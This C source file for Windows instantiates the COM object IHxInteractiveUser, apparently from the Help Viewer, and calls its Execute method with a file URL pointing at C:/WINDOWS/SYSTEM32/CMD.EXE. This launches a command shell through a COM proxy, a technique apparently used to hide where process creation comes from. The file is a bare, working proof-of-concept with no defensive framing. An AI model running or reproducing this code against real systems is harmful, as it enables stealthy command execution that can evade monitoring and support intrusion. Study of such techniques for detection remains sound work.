#include <Windows.h>
#include <Objbase.h>

struct __declspec(uuid("8cec595b-07a1-11d9-b15e-000d56bfe6ee"))
    IHxInteractiveUser : public IUnknown {
    virtual VOID __stdcall Execute(PWCHAR pcUrl) = 0;
};

DWORD Win32FromHResult(HRESULT Result)
{
    if ((Result & 0xFFFF0000) == MAKE_HRESULT(SEVERITY_ERROR, FACILITY_WIN32, 0))
        return HRESULT_CODE(Result);

    if (Result == S_OK)
        return ERROR_SUCCESS;

    return ERROR_CAN_NOT_COMPLETE;
}

HRESULT CoInitializeIHxInteractiveUserIds(LPGUID Clsid, LPGUID Iid)
{
    HRESULT Result = S_OK;

    if (!SUCCEEDED(Result = CLSIDFromString(L"{8cec58e7-07a1-11d9-b15e-000d56bfe6ee}", Clsid)))
        return Result;

    if (!SUCCEEDED(Result = CLSIDFromString(L"{8cec595b-07a1-11d9-b15e-000d56bfe6ee}", Iid)))
        return Result;

    return Result;
}


INT main(VOID)
{
    HRESULT Result = S_OK;
    GUID CLSID_IHxInteractiveUser;
    GUID IID_IHxInteractiveUser;
    WCHAR pcUrl[256] = L"file:///C:/WINDOWS/SYSTEM32/CMD.EXE";
    IHxInteractiveUser* User = NULL;

    if (!SUCCEEDED(Result = CoInitializeIHxInteractiveUserIds(&CLSID_IHxInteractiveUser, &IID_IHxInteractiveUser)))
        return Win32FromHResult(Result);

    if (!SUCCEEDED(Result = CoInitializeEx(NULL, COINIT_MULTITHREADED)))
        return Win32FromHResult(Result);

    if (!SUCCEEDED(Result = CoCreateInstance(CLSID_IHxInteractiveUser, NULL, CLSCTX_ALL, IID_IHxInteractiveUser, (PVOID*)&User)))
        return Win32FromHResult(Result);

    User->Execute(pcUrl);

    if (User)
        User->Release();

    CoUninitialize();

	return Win32FromHResult(Result);
}
